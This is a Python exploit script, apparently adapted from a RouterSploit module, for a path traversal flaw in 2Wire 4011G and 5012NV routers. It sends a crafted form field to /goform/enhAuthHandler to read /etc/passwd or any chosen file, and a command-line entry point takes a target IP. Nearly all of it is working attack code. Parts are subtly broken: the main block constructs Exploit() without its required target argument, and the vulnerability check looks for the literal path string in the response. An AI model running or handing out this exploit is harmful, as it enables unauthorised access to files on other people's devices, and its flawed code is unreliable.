target = ""
# rsf exploit module
# description: Exploits path traversal vulnerability in 2Wire 4011G and 5012NV devices. 
# If the target is vulnerable, it is possible to read files from the filesystem.

import requests

class Exploit:
    __info__ = {
        "name": "2Wire 4011G & 5012NV Path Traversal",
        "description": "Module exploits path traversal vulnerability in 2Wire 4011G and 5012NV devices. "
                       "If the target is vulnerable it is possible to read file from the filesystem.",
        "authors": (
            "adiaz",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.underground.org.mx/index.php?topic=28616.0",
        ),
        "devices": (
            "2Wire 4011G",
            "2Wire 5012NV",
        ),
    }

    def __init__(self, target, port=80, filename="/etc/passwd"):
        self.target = target
        self.port = port
        self.filename = filename

    def run(self):
        if self.check():
            print(f"Target {self.target} is vulnerable")
            print(f"Sending read {self.filename} file request")

            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            data = {
                "__ENH_SHOW_REDIRECT_PATH__": f"/pages/C_4_0.asp/../../..{self.filename}",
                "__ENH_SUBMIT_VALUE_SHOW__": "Acceder",
                "__ENH_ERROR_REDIRECT_PATH__": "",
                "username": "tech"
            }

            response = requests.post(
                f"http://{self.target}:{self.port}/goform/enhAuthHandler", 
                headers=headers, data=data
            )

            if response is None:
                return

            print(f"Reading file {self.filename}")
            print(response.text)
        else:
            print("Target seems to be not vulnerable")

    def check(self):
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = {
            "__ENH_SHOW_REDIRECT_PATH__": "/pages/C_4_0.asp/../../../etc/passwd",
            "__ENH_SUBMIT_VALUE_SHOW__": "Acceder",
            "__ENH_ERROR_REDIRECT_PATH__": "",
            "username": "tech"
        }
        
        response = requests.post(
            f"http://{self.target}:{self.port}/goform/enhAuthHandler", 
            headers=headers, data=data
        )

        if response and "/etc/passwd" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
